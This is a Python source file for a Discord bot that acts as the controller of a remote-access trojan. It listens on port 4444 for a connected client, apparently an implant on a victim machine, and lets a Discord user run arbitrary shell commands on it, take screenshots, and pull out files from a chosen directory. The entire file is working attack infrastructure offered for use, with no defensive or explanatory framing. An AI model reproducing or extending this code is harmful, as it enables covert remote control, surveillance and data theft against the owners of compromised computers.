import discord
from discord.ext import commands
import socket
import threading
import random
import queue
import os
import logging

logging.basicConfig(level=logging.INFO)

TOKEN = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
SERVER = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
PORT = 4444

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix='@', intents=intents)

client_socket = None
command_queue = queue.Queue()
response_queue = queue.Queue()

def socket_server():
    global client_socket
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((SERVER, PORT))
            s.listen(1)
            logging.info(f'[*] Listening as {SERVER}:{PORT}')

            client_socket, client_address = s.accept()
            logging.info(f'[+] Client connected: {client_address}')
            client_socket.send('Connected'.encode())

            while True:
                cmd = command_queue.get()
                if cmd == 'quit':
                    break
                client_socket.send(cmd.encode())
                response = client_socket.recv(4096).decode()
                response_queue.put(response)

            client_socket.close()
            s.close()
        except Exception as e:
            logging.error(f"Error in socket server: {e}")
            continue

@bot.command(name='shell')
async def shell(ctx):
    try:
        if client_socket is None:
            await ctx.send('No client connected.')
            return

        def check(msg):
            return msg.author == ctx.author and msg.channel == ctx.channel

        await ctx.send('Enter the shell command:')
        msg = await bot.wait_for('message', check=check)
        cmd = msg.content
        command_queue.put(cmd)

        response = response_queue.get()
        await ctx.send(f'```{response}```')

    except Exception as e:
        logging.error(f"Error in shell command: {e}")
        await ctx.send('An error occurred while processing the command.')

@bot.command(name='screenshot')
async def screenshot(ctx):
    try:
        if client_socket is None:
            await ctx.send('No client connected.')
            return

        command_queue.put('scrs')

        screenshot_data = b''
        while True:
            data = response_queue.get()
            if not data:
                break
            screenshot_data += data

        if screenshot_data:
            screenshot_file = f'client_screenshot_{random.randint(1, 100000000)}.png'
            with open(screenshot_file, 'wb') as scr_f:
                scr_f.write(screenshot_data)
            await ctx.send(file=discord.File(screenshot_file))
            os.remove(screenshot_file)
        else:
            await ctx.send('No screenshot data received.')

    except Exception as e:
        logging.error(f"Error in screenshot command: {e}")
        await ctx.send('An error occurred while processing the command.')

@bot.command(name='getdir')
async def getdir(ctx):
    try:
        if client_socket is None:
            await ctx.send('No client connected.')
            return

        def check(msg):
            return msg.author == ctx.author and msg.channel == ctx.channel

        await ctx.send('Enter the directory to retrieve:')
        dir_msg = await bot.wait_for('message', check=check)
        directory = dir_msg.content

        await ctx.send('Enter the file extension:')
        ext_msg = await bot.wait_for('message', check=check)
        f_extension = ext_msg.content

        command_queue.put(f'getdir {directory} {f_extension}')

        file_path = f'client_file_{random.randint(1, 1000000000)}.{f_extension}'
        with open(file_path, 'wb') as f:
            while True:
                data = response_queue.get()
                if not data:
                    break
                f.write(data)

        await ctx.send(file=discord.File(file_path))
        os.remove(file_path)
    except Exception as e:
        logging.error(f"Error in getdir command: {e}")
        await ctx.send('An error occurred while processing the command.')

@bot.event
async def on_ready():
    logging.info(f'Bot is ready as {bot.user}')
    threading.Thread(target=socket_server, daemon=True).start()

bot.run(TOKEN)
